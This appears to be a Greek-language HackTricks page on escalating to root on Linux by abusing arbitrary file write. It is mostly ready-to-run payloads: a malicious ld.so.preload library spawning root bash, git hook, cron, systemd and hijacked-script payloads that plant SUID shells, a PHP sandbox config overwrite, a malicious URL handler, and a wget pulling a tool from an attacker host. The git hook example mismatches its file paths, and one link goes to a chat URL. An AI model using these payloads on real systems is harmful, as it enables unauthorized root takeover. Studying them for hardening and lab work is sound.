# Αυθαίρετη εγγραφή αρχείου ως root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`**, αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλά να προσθέσετε μια **διαδρομή προς μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο binary.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **scripts** που **run** σε διάφορα **events** σε ένα git repository, όπως όταν δημιουργείται ένα commit, γίνεται merge κ.λπ. Οπότε, αν ένα **privileged script or user** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατό να **write in the `.git` folder**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & αρχεία χρονισμού

Αν μπορείτε να **γράψετε αρχεία σχετικά με το cron που εκτελεί ο root**, συνήθως μπορείτε να αποκτήσετε εκτέλεση κώδικα την επόμενη φορά που θα τρέξει η εργασία. Ενδιαφέροντα στόχοι περιλαμβάνουν:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Το crontab του root στο `/var/spool/cron/` ή `/var/spool/cron/crontabs/`
- `systemd` timers και οι υπηρεσίες που ενεργοποιούν

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Τυπικές διαδρομές κατάχρησης:

- **Προσθέστε ένα νέο root cron job** στο `/etc/crontab` ή σε ένα αρχείο στο `/etc/cron.d/`
- **Αντικαταστήστε ένα script** που ήδη εκτελείται από `run-parts`
- **Backdoor an existing timer target** τροποποιώντας το script ή το binary που εκκινεί

Ελάχιστο παράδειγμα cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Αν μπορείτε να γράψετε μόνο μέσα σε έναν κατάλογο του cron που χρησιμοποιείται από `run-parts`, τοποθετήστε εκεί ένα εκτελέσιμο αρχείο αντ' αυτού:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Σημειώσεις:

- `run-parts` συνήθως αγνοεί ονόματα αρχείων που περιέχουν τελείες, οπότε προτιμήστε ονόματα όπως `backup` αντί για `backup.sh`.
- Ορισμένες διανομές χρησιμοποιούν `anacron` ή `systemd` timers αντί για το κλασικό cron, αλλά η ιδέα της κατάχρησης είναι η ίδια: **τροποποιήστε αυτό που θα εκτελέσει αργότερα ο root**.

### Αρχεία Service & Socket

Εάν μπορείτε να γράψετε **`systemd` unit files** ή αρχεία που αναφέρονται από αυτά, ενδέχεται να καταφέρετε εκτέλεση κώδικα ως root επαναφορτώνοντας και επανεκκινώντας τη μονάδα, ή περιμένοντας να ενεργοποιηθεί η διαδρομή ενεργοποίησης service/socket.

Ενδιαφέροντες στόχοι περιλαμβάνουν:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides στο `/etc/systemd/system/<unit>.d/*.conf`
- Σενάρια/εκτελέσιμα service που αναφέρονται από `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Εγγράψιμα μονοπάτια `EnvironmentFile=` που φορτώνονται από υπηρεσία root

Γρήγοροι έλεγχοι:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Συνηθισμένοι τρόποι κατάχρησης:

- **Overwrite `ExecStart=`** σε μια μονάδα service που ανήκει στο root και μπορείτε να τροποποιήσετε
- **Add a drop-in override** με κακόβουλο `ExecStart=` και αφαιρέστε πρώτα το παλιό
- **Backdoor the script/binary** που ήδη αναφέρεται από τη μονάδα
- **Hijack a socket-activated service** τροποποιώντας το αντίστοιχο αρχείο `.service` που εκκινείται όταν το socket λαμβάνει σύνδεση

Παράδειγμα κακόβουλου override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Τυπική ροή ενεργοποίησης:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Αν δεν μπορείτε να επανεκκινήσετε υπηρεσίες μόνοι σας αλλά μπορείτε να επεξεργαστείτε μια socket-activated unit, μπορεί να χρειαστεί μόνο να **περιμένετε για μια σύνδεση πελάτη** για να ενεργοποιηθεί η εκτέλεση της backdoored service ως root.

### Αντικατάσταση ενός περιοριστικού `php.ini` που χρησιμοποιείται από έναν privileged PHP sandbox

Ορισμένα custom daemons επικυρώνουν το PHP που παρέχει ο χρήστης τρέχοντας `php` με ένα **restricted `php.ini`** (για παράδειγμα, `disable_functions=exec,system,...`). Εάν ο sandboxed κώδικας εξακολουθεί να έχει **any write primitive** (όπως `file_put_contents`) και μπορείτε να φτάσετε στο **exact `php.ini` path** που χρησιμοποιεί ο daemon, μπορείτε να **overwrite that config** για να καταργήσετε τους περιορισμούς και στη συνέχεια να υποβάλετε ένα δεύτερο payload που θα τρέξει με αυξημένα προνόμια.

Τυπική ροή:

1. First payload επαναγράφει το sandbox config.
2. Second payload εκτελεί κώδικα τώρα που οι dangerous functions έχουν ενεργοποιηθεί ξανά.

Ελάχιστο παράδειγμα (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. Αυτό είναι ουσιαστικά **privilege escalation via config overwrite** όταν το sandboxed runtime μπορεί ακόμα να γράφει αρχεία.

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` δείχνει ποιο binary πρέπει να εκτελεί ποιον τύπο αρχείου. TODO: έλεγξε τις προϋποθέσεις για να καταχραστείς αυτό ώστε να εκτελέσει ένα rev shell όταν ένας κοινός τύπος αρχείου ανοίγεται.

### Overwrite schema handlers (like http: or https:)

Ένας επιτιθέμενος με δικαιώματα εγγραφής στους φακέλους ρυθμίσεων του θύματος μπορεί εύκολα να αντικαταστήσει ή να δημιουργήσει αρχεία που αλλάζουν τη συμπεριφορά του συστήματος, προκαλώντας ανεπιθύμητη εκτέλεση κώδικα. Τροποποιώντας το αρχείο `$HOME/.config/mimeapps.list` ώστε να δείχνει τους HTTP και HTTPS URL handlers σε ένα κακόβουλο αρχείο (π.χ. ρυθμίζοντας `x-scheme-handler/http=evil.desktop`), ο επιτιθέμενος διασφαλίζει ότι **το κλικ σε οποιονδήποτε σύνδεσμο http ή https ενεργοποιεί τον κώδικα που καθορίζεται σε εκείνο το `evil.desktop` αρχείο**. Για παράδειγμα, μετά την τοποθέτηση του ακόλουθου κακόβουλου κώδικα στο `evil.desktop` στο `$HOME/.local/share/applications`, κάθε εξωτερικό κλικ σε URL εκτελεί την ενσωματωμένη εντολή:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Για περισσότερες πληροφορίες δείτε [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) όπου χρησιμοποιήθηκε για να εκμεταλλευτεί μια πραγματική ευπάθεια.

### Root που εκτελεί scripts/εκτελέσιμα εγγράψιμα από χρήστη

Αν μια ροή εργασίας με προνόμια εκτελεί κάτι σαν `/bin/sh /home/username/.../script` (ή οποιοδήποτε εκτελέσιμο μέσα σε έναν κατάλογο που ανήκει σε μη προνομιούχο χρήστη), μπορείτε να το υποκλέψετε:

- **Εντοπισμός εκτέλεσης:** παρακολουθήστε διεργασίες με [pspy](https://github.com/DominicBreuker/pspy) για να εντοπίσετε όταν ο root καλεί μονοπάτια ελεγχόμενα από χρήστη:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Επιβεβαιώστε δυνατότητα εγγραφής:** βεβαιωθείτε ότι τόσο το αρχείο-στόχος όσο και ο κατάλογός του ανήκουν και είναι εγγράψιμα από τον χρήστη σας.
- **Κατάληψη του στόχου:** δημιουργήστε αντίγραφο ασφαλείας του αρχικού binary/script και αφήστε ένα payload που δημιουργεί ένα SUID shell (ή οποιαδήποτε άλλη root action), στη συνέχεια επαναφέρετε τα δικαιώματα:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Προκαλέστε την ενέργεια με προνόμια** (π.χ., πατώντας ένα κουμπί UI που δημιουργεί τον helper). Όταν ο root επανεκτελέσει το hijacked path, πάρτε το escalated shell με `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
